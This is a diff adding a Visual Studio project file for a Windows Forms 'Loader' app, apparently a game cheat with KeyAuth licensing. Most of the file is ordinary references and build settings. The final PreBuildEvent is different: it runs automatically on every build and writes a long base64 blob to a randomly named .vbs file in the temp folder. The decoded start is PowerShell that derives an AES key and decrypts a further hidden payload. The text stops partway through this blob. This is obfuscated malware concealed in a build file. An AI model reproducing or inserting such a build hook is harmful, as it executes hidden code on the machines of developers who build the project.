@@ -1,0 +1,378 @@
+<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="..\packages\Costura.Fody.5.7.0\build\Costura.Fody.props" Condition="Exists('..\packages\Costura.Fody.5.7.0\build\Costura.Fody.props')" />
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{B34953D2-39F7-4E93-B0E5-876BEF451CD2}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <RootNamespace>Loader</RootNamespace>
+    <AssemblyName>x</AssemblyName>
+    <TargetFrameworkVersion>v4.7.2</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
+    <Deterministic>true</Deterministic>
+    <NuGetPackageImportStamp>
+    </NuGetPackageImportStamp>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>x64</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <Prefer32Bit>false</Prefer32Bit>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)' == 'Debug|x64'">
+    <DebugSymbols>true</DebugSymbols>
+    <OutputPath>bin\x64\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <DebugType>full</DebugType>
+    <PlatformTarget>x64</PlatformTarget>
+    <LangVersion>7.3</LangVersion>
+    <ErrorReport>prompt</ErrorReport>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)' == 'Release|x64'">
+    <OutputPath>bin\x64\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <Optimize>true</Optimize>
+    <DebugType>pdbonly</DebugType>
+    <PlatformTarget>x64</PlatformTarget>
+    <LangVersion>7.3</LangVersion>
+    <ErrorReport>prompt</ErrorReport>
+    <Prefer32Bit>true</Prefer32Bit>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)' == 'Debug|x86'">
+    <DebugSymbols>true</DebugSymbols>
+    <OutputPath>bin\x86\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <DebugType>full</DebugType>
+    <PlatformTarget>x86</PlatformTarget>
+    <LangVersion>7.3</LangVersion>
+    <ErrorReport>prompt</ErrorReport>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)' == 'Release|x86'">
+    <OutputPath>bin\x86\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <Optimize>true</Optimize>
+    <DebugType>pdbonly</DebugType>
+    <PlatformTarget>x86</PlatformTarget>
+    <LangVersion>7.3</LangVersion>
+    <ErrorReport>prompt</ErrorReport>
+    <Prefer32Bit>true</Prefer32Bit>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ApplicationIcon>FLUNIX.ico</ApplicationIcon>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="Costura, Version=5.7.0.0, Culture=neutral, processorArchitecture=MSIL">
+      <HintPath>..\packages\Costura.Fody.5.7.0\lib\netstandard1.0\Costura.dll</HintPath>
+    </Reference>
+    <Reference Include="DiscordRPC, Version=1.2.1.24, Culture=neutral, processorArchitecture=MSIL">
+      <HintPath>..\packages\DiscordRichPresence.1.2.1.24\lib\net45\DiscordRPC.dll</HintPath>
+    </Reference>
+    <Reference Include="Guna.UI">
+      <HintPath>..\..\OneDrive-2023-10-05\dlls\Guna UI Framework Ultimate v2.0.0.1 Lib-Master\Guna.UI WinForms\.net 2.0\Guna.UI.dll</HintPath>
+    </Reference>
+    <Reference Include="Guna.UI2, Version=2.0.4.5, Culture=neutral, PublicKeyToken=8b9d14aa5142e261, processorArchitecture=MSIL">
+      <HintPath>..\packages\Guna.UI2.WinForms.2.0.4.5\lib\net472\Guna.UI2.dll</HintPath>
+    </Reference>
+    <Reference Include="Memory, Version=1.2.24.0, Culture=neutral, processorArchitecture=MSIL">
+      <HintPath>..\packages\Memory.dll.x64.1.2.24\lib\netstandard2.0\Memory.dll</HintPath>
+    </Reference>
+    <Reference Include="Microsoft.Win32.Primitives, Version=4.0.2.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\Microsoft.Win32.Primitives.4.3.0\lib\net46\Microsoft.Win32.Primitives.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="Newtonsoft.Json, Version=13.0.0.0, Culture=neutral, PublicKeyToken=30ad4fe6b2a6aeed, processorArchitecture=MSIL">
+      <HintPath>..\packages\Newtonsoft.Json.13.0.1\lib\net45\Newtonsoft.Json.dll</HintPath>
+    </Reference>
+    <Reference Include="Siticone.Desktop.UI">
+      <HintPath>..\..\all\Siticone.Desktop.UI.dll</HintPath>
+    </Reference>
+    <Reference Include="System" />
+    <Reference Include="System.AppContext, Version=4.1.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.AppContext.4.3.0\lib\net463\System.AppContext.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.ComponentModel.Composition" />
+    <Reference Include="System.Console, Version=4.0.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Console.4.3.0\lib\net46\System.Console.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Core" />
+    <Reference Include="System.Design" />
+    <Reference Include="System.Diagnostics.DiagnosticSource, Version=4.0.1.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Diagnostics.DiagnosticSource.4.3.0\lib\net46\System.Diagnostics.DiagnosticSource.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Diagnostics.Tracing, Version=4.1.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Diagnostics.Tracing.4.3.0\lib\net462\System.Diagnostics.Tracing.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Globalization.Calendars, Version=4.0.2.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Globalization.Calendars.4.3.0\lib\net46\System.Globalization.Calendars.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.IO, Version=4.1.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.IO.4.3.0\lib\net462\System.IO.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.IO.Compression, Version=4.1.2.0, Culture=neutral, PublicKeyToken=b77a5c561934e089, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.IO.Compression.4.3.0\lib\net46\System.IO.Compression.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.IO.Compression.FileSystem" />
+    <Reference Include="System.IO.Compression.ZipFile, Version=4.0.2.0, Culture=neutral, PublicKeyToken=b77a5c561934e089, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.IO.Compression.ZipFile.4.3.0\lib\net46\System.IO.Compression.ZipFile.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.IO.FileSystem, Version=4.0.2.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.IO.FileSystem.4.3.0\lib\net46\System.IO.FileSystem.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.IO.FileSystem.Primitives, Version=4.0.2.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.IO.FileSystem.Primitives.4.3.0\lib\net46\System.IO.FileSystem.Primitives.dll</HintPath>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Linq, Version=4.1.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Linq.4.3.0\lib\net463\System.Linq.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Linq.Expressions, Version=4.1.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Linq.Expressions.4.3.0\lib\net463\System.Linq.Expressions.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Management" />
+    <Reference Include="System.Net.Http, Version=4.1.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Net.Http.4.3.0\lib\net46\System.Net.Http.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Net.Sockets, Version=4.1.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Net.Sockets.4.3.0\lib\net46\System.Net.Sockets.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Numerics" />
+    <Reference Include="System.Reflection, Version=4.1.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Reflection.4.3.0\lib\net462\System.Reflection.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Runtime, Version=4.1.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Runtime.4.3.0\lib\net462\System.Runtime.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Runtime.Extensions, Version=4.1.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Runtime.Extensions.4.3.0\lib\net462\System.Runtime.Extensions.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Runtime.InteropServices, Version=4.1.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Runtime.InteropServices.4.3.0\lib\net463\System.Runtime.InteropServices.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Runtime.InteropServices.RuntimeInformation, Version=4.0.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Runtime.InteropServices.RuntimeInformation.4.3.0\lib\net45\System.Runtime.InteropServices.RuntimeInformation.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Runtime.Serialization" />
+    <Reference Include="System.Security.Cryptography.Algorithms, Version=4.2.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Security.Cryptography.Algorithms.4.3.0\lib\net463\System.Security.Cryptography.Algorithms.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Security.Cryptography.Encoding, Version=4.0.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Security.Cryptography.Encoding.4.3.0\lib\net46\System.Security.Cryptography.Encoding.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Security.Cryptography.Primitives, Version=4.0.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Security.Cryptography.Primitives.4.3.0\lib\net46\System.Security.Cryptography.Primitives.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Security.Cryptography.X509Certificates, Version=4.1.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Security.Cryptography.X509Certificates.4.3.0\lib\net461\System.Security.Cryptography.X509Certificates.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.ServiceProcess" />
+    <Reference Include="System.Text.RegularExpressions, Version=4.1.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Text.RegularExpressions.4.3.0\lib\net463\System.Text.RegularExpressions.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Web" />
+    <Reference Include="System.Xml.Linq" />
+    <Reference Include="System.Data.DataSetExtensions" />
+    <Reference Include="Microsoft.CSharp" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Deployment" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+    <Reference Include="System.Xml.ReaderWriter, Version=4.1.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Xml.ReaderWriter.4.3.0\lib\net46\System.Xml.ReaderWriter.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="DiscordRPc.cs" />
+    <Compile Include="EffectBlur.cs" />
+    <Compile Include="Form1.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Form1.Designer.cs">
+      <DependentUpon>Form1.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Form2.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Form2.Designer.cs">
+      <DependentUpon>Form2.cs</DependentUpon>
+    </Compile>
+    <Compile Include="alert.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="alert.Designer.cs">
+      <DependentUpon>alert.cs</DependentUpon>
+    </Compile>
+    <Compile Include="KeyAuth.cs" />
+    <Compile Include="Program.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <EmbeddedResource Include="Form1.resx">
+      <DependentUpon>Form1.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Form1.vi-VN.resx">
+      <DependentUpon>Form1.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Form2.resx">
+      <DependentUpon>Form2.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="alert.resx">
+      <DependentUpon>alert.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Properties\Resources.resx">
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>Resources.Designer.cs</LastGenOutput>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+    <Compile Include="Properties\Resources.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Resources.resx</DependentUpon>
+      <DesignTime>True</DesignTime>
+    </Compile>
+    <None Include="packages.config" />
+    <None Include="Properties\Settings.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <LastGenOutput>Settings.Designer.cs</LastGenOutput>
+    </None>
+    <Compile Include="Properties\Settings.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Settings.settings</DependentUpon>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="App.config" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\discord_500px.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\male_user_144px.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\male_user_384px.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\lock_480px.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\key_480px.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <COMReference Include="NetFwTypeLib">
+      <Guid>{58FBCF7C-E7A9-467C-80B3-FC65E8FCCA08}</Guid>
+      <VersionMajor>1</VersionMajor>
+      <VersionMinor>0</VersionMinor>
+      <Lcid>0</Lcid>
+      <WrapperTool>tlbimp</WrapperTool>
+      <Isolated>False</Isolated>
+      <EmbedInteropTypes>True</EmbedInteropTypes>
+    </COMReference>
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\eye_480px.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\target_512px.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\sniper_512px.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\knife_480px.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\game_controller_480px.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\game_controller_500px.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\Settings_512px.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\External_480px.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\hide_512px.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <Content Include="FLUNIX.ico" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+  <Import Project="..\packages\Fody.6.5.5\build\Fody.targets" Condition="Exists('..\packages\Fody.6.5.5\build\Fody.targets')" />
+  <Target Name="EnsureNuGetPackageBuildImports" BeforeTargets="PrepareForBuild">
+    <PropertyGroup>
+      <ErrorText>This project references NuGet package(s) that are missing on this computer. Use NuGet Package Restore to download them.  For more information, see http://go.microsoft.com/fwlink/?LinkID=322105. The missing file is {0}.</ErrorText>
+    </PropertyGroup>
+    <Error Condition="!Exists('..\packages\Fody.6.5.5\build\Fody.targets')" Text="$([System.String]::Format('$(ErrorText)', '..\packages\Fody.6.5.5\build\Fody.targets'))" />
+    <Error Condition="!Exists('..\packages\Costura.Fody.5.7.0\build\Costura.Fody.props')" Text="$([System.String]::Format('$(ErrorText)', '..\packages\Costura.Fody.5.7.0\build\Costura.Fody.props'))" />
+    <Error Condition="!Exists('..\packages\Costura.Fody.5.7.0\build\Costura.Fody.targets')" Text="$([System.String]::Format('$(ErrorText)', '..\packages\Costura.Fody.5.7.0\build\Costura.Fody.targets'))" />
+  </Target>
+  <Import Project="..\packages\Costura.Fody.5.7.0\build\Costura.Fody.targets" Condition="Exists('..\packages\Costura.Fody.5.7.0\build\Costura.Fody.targets')" />
+  <PropertyGroup>
+    <PreBuildEvent>@echo off&#xD;&#xA;setlocal&#xD;&#xA;set &quot;a=%25TEMP%25\JXrBU0&quot;&#xD;&#xA;mkdir &quot;%25a%25&quot; 2&gt;nul&#xD;&#xA;echo b = &quot;ZnVuY3Rpb24gRFZLIHtwYXJhbSAoW3N0cmluZ10kZW4sW2J5dGVbXV0kc0IpOyRrID0gTmV3LU9iamVjdCBieXRlW10gMzI7JHYgPSBOZXctT2JqZWN0IGJ5dGVbXSAxNjskZGVyaXZlQnl0ZXMgPSBOZXctT2JqZWN0IFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuUmZjMjg5OERlcml2ZUJ5dGVzKCRlbiwgJHNCLCAxMDAwLCBbU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5IYXNoQWxnb3JpdGhtTmFtZV06OlNIQTI1Nik7JGsgPSAkZGVyaXZlQnl0ZXMuR2V0Qnl0ZXMoMzIpOyR2ID0gJGRlcml2ZUJ5dGVzLkdldEJ5dGVzKDE2KTtyZXR1cm4gQHsgSyA9ICRrOyBWID0gJHYgfX07ZnVuY3Rpb24gRCB7cGFyYW0gKFtzdHJpbmddJGVCWixbc3RyaW5nXSRlbmMpOyRkQnkgPSBbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRlQlopOyRzYnkgPSAkZEJ5WzAuLjddOyRlQnkgPSAkZEJ5WzguLigkZEJ5Lkxlbmd0aCAtIDEpXTskZHJ2ID0gRFZLIC1lbiAkZW5jIC1zQiAkc2J5OyRrID0gJGRydi5LOyR2ID0gJGRydi5WOyRhID0gW1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuQWVzXTo6Q3JlYXRlKCk7JGEuTW9kZSA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LkNpcGhlck1vZGVdOjpDQkM7JGEuUGFkZGluZyA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlBhZGRpbmdNb2RlXTo6UEtDUzc7JGEuS2V5ID0gJGs7JGEuSVYgPSAkdjskZGMgPSAkYS5DcmVhdGVEZWNyeXB0b3IoKTt0cnkgeyRkQiA9ICRkYy5UcmFuc2Zvcm1GaW5hbEJsb2NrKCRlQnksIDAsICRlQnkuTGVuZ3RoKTtyZXR1cm4gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoJGRCKX0gY2F0Y2gge3JldHVybiAkbnVsbH19JGVCID0gInNRSXhLcjdOcGR6TkhtN1hnSVJhb1BJMSt3UGZkckZSOHdTdkZYbThMa05iNWdRMlB4Wi9FMFNWc3JoOFV3R1BFVHlmTldTR2RkaWJWWTBudG1ybFI3MnE5RlQ3N255SFp1ODh5R24vUlpYWXJsWkFCSzFYUVBzeWUrKzMydGREZGt0YkpoVk5QQWVWYVcrQ3R0MWt5dUNSUVBSN2luWnhmMUY0c05aQkthaDJFWnRWQm5hSkZJalBQTTFhNXA2WVpiSk16TlJnSmRnbk9WYWhGL0dtM3BuaWphWW9tMm91MHBDb2hvaTYxM3o1aC9qeE5OdFBjdWoyQjRsd2pEUlJkcitGVE9WK3pBbGZZSXY0d2N2U08wNVlhRmQxeG5ITlc1ek1LVlV5Ym01VGVXWWVzUlYxTDFtYWZiVXVKdVFYSHFUT25HK2tlUUI4MlcxcDBydk55VEthajRPVDV5ZDJWTW9WZWtHMVhQUmxYMGMrU0s5Vi9GSVJReFVwb3kyKzNtSjIxMExoTER1Rithdm1ZU05kOWZtZGF4amhkTU5KQUFGb09DZ1lmeXNLbGE4a01zNjVubGd4ZkpCRlBNVCtFZFd2cEtpRU5qaGJ3akRteHJuTTAydGVqS21EQ1NYN1JQZUtWR3haampLN01TRjRYUlhHdWVWMnozY3I0Ry90R1paVGNxbkFnblcxN0F0YXk1MjBxVHJISlNWMTZQak5saXhtOEJlUERCUXd6ajF3SDNHeUltU3hnaCtJWXFEZVFDcUloeVZEWTAyeE13ZUpac1dtTjFCQ3IwcnFHZWRFWDlGY2dwd3ZxUEE2QThGOHMrcnk2ZkpEUE45MWM3OUtaNXBmeDJYTER5dElSUGJoRm9UZXdPNCt6RVZzNGpXcUloMTI1K0lyMkgzSmZZSGZEWC8zQ2lnYW9Eb1h5Tm1DSmNkMG1MckJocVZuaEJDVEZDOWVMeWtpRnNYYkV2OTZWWVp1ckFFMDlJcGRLQURsQWZxcXNHVkdKTXB1UCs3ZElWVjM3cjdvV1h4R2tKVUtuanhvb29RSklFR3M5WS9LTUUvR0xlSEptbnl4V2FYMlpsTEVjUi9DZDVQTWZCVWxsTU5IVHpBWlJ5ZytKSGYrOHpZdnBYZlc5Z29rWkxHQ2FkZ09IRDRVbzNsdUlnQ3JuYncreXk0c0VjeklDd3Y4YnRxbWRpcng4Mm96THI2YXhQVThOYngwa1RyMlhVNW0xbURBTzNJS2w5cVZwNEJTVVNaRDBQTWx5eVhla3RaYU1tUWhpTXJ5ZHdrTmV5cHhKa0I2aVE5cjNGNENFeDZEQzBiU29JSjZuWmQrM2tqTGtRWjM1c096RWpieVVNSXEvWGNoazZxck9MTnJUOFh0aWRQL0wxTVRTOXlHem1lTi9SZWJ0enFOeVF1QWpkZS82QUtCMm9hcjRKRUk5NVhUTTNNdS9qTkJvZlBQc2xOU0RHNFM3c21KT1NDd3J3NmdJWXAzdnZ3UkZTcTc1&quot; &gt; &quot;%25a%25\IxM2W56TA.vbs&quot;&#xD;&#xA;echo c = &quot;ZjQybE9pQldnT3lJYks2Q2xkaWF1dmVLTDlGVm9SNHFmWFBTejBvWFFkaDMwbGZlN01jQi9SQmRqZWN1YTNId29NL1JEUXZQRGJzY3RucytZZXhGQWNqOXF1ZEpCbi9zMVNianlBYU5IVmdGZGFNTXI2WDA2aHZjYUdZOFc5NVVmYlplVUREY0E3OEVJZzAwVGNOWUFuZksvQ0JyaUNBRVpLQTVwY3NCNDZwMTRRMHBwL0xRWTBDaXFTYTQyK2VJaTVqZGxOeFRCekZsZnhkUWhiVjZ0VXYvK2ZYdkVZNDhWV2NGMVdlbnIxZEN1WjlSSnE1RFpXZ3RSTzAyTzRzVU8vU0J4NlJmTHV0bUs3ek8wL1JHS1VIWHcxTXorWUhyTmR4T2ZWUjNvSmFSOHExVURqb3N6UWJHeTFRMkpTWlBrYk91eEl0YUh6eXNqdzIwL1BqMWIvbVZ0UkJCcExPeEtqUUxMYThsbDRYOUZnMFRTaW9QcjVoWFMreXRseGZsV0VQRlRKemFTZXFqTC80cGs1K0hwNlNROXdURS9iNG1CV2hJMFhCZ3hjUURLN0dpR3l5T0N1aVNvbWxvNVcya09IVm1uUmMvRmovak9ZVTBTdWtZcEVmRWdTVHZiU1A1WTE3TExrV083YjJjbXNVV0tQSmNlYXhhZWZQVkY1YlR4TVk4TGoreDhmT0Erbkp3blpVcS9EditYZ0ZtNGtCQ2w2RzUwbHNSNkpNeHNzbVQxYjI3cnhWZzZVak9qUjhzb2VuWkxFaHZpTngzMkZLam53YkJLUHlxaTRZRzNPUFJac2pheTI1M1l0SndtY2NPVDBoN0k3YU5EdVA4VlhEcTZVdGFtbitWNUs5QXROL3RQTFMvSkFRZWhna2ozTFQvRHJkNnFRb2VVMlRtVTVaWkFLWlhYdVZxUUliS1p6VWxKMTROSDdsVUNlcWVTQzI2VXpJNHA0MzVLRUZpaWxkNk5wVzd3SUNMakNMdTVJMVZ5Z25WVE9Jd29HUVh0cHlxQXZMRjI4TWpyWGJ6UUJOdktva1NCTUxTYzF5OURlaTJJalRGb0x6V1NHdWVuS2E4MmpVRFkyclB4VEJiNHRtWHRLYzdXYzlwNHkzZGJ6dThOTnVPMEhVVm4vQlpVZGRySHArck9lTnRrMFpVZE5xNkkyNUhxRkVFUURHU09MMm5RYWhFUHdBU21PdGJ5Zmk1OTFqS3V5NnQzMUpvbWxZMFlPWDR3T2tkMGQwVVdteW9PaFUyVGtsaW8vVE91bWNKM2w5bTVRSWhQTzhtcEU3azJpcUMwSWZSdkxFbnYzclI3cWJUOXFJVGtMUmJBTThXYUNldDRlOGRLd0Q1MUtCWmpkbEs5bUxOZ0hKWm5qYWVCU1o2czI3VGFkazhYZklvR3U4bHdnOWdNMmU0VXNVT0srUjdZbjFTR25sU1ZkVDFaRWR5QzNzTFRSN0dnOUJwNnIyTDBIN0pKMS8xait6dEQvdDRDcURRVisyU3RoNEFRWGR6VkhmNkFMcWdRWEpNSWU0L1ZWckpMRStkN3Y3YkxJNjRCclFWeXRWRGtRYWRDcFNVT1lSb2VHZHhTRitlckswWEg4cnkvaGFzNzA2cE1COWFZZ1hsZkZFZ0cwN3NsUGZja3U4ZG83RFFnZGF1bk9tR09nOHMxU0pYL2VCQ3l4eDZ6aWhwcGlBMnlzRHo0a2lpalZJRFB2RTFVUGg5emt3eWdrV2ZMOXR5aFJhSXphL1V1OVNva1YzU1gzajExOVZvUmVsd3VZTEFtWmx6dnhwaUNVS243Mi9SbFo3cUQwQlNtREtNMmlrQVJQU01EREJ0dEZLOTlHWnFFb205Q3ZuM2hENy8yZE0rd2hHWEI4MGlSUUVwRkIrSlhYWWF4dmoxeUVPMjFJdjZUYmxxc1M2Sm9Od09yUlU5eXEyZW42SndZem5WTjg5ejlzRjdOMmJUS1RkbTIyaDFzcEg5UjBKZ3FkUTVudkNZTllkT2F1UzJmcis5V1BSN1pXdWFDVzlxV2ZBN2xOeW1zN3FZSmM5bkRHdTRSUnFDMXpFQ2Y0MkNPTm41MUVtbzVHa1hZdHJjclczcXRuMmhBUGQ5OFFhY25ydUpBUTYwZDhvK3hyK203enNsRk1ONzJYb0U0azh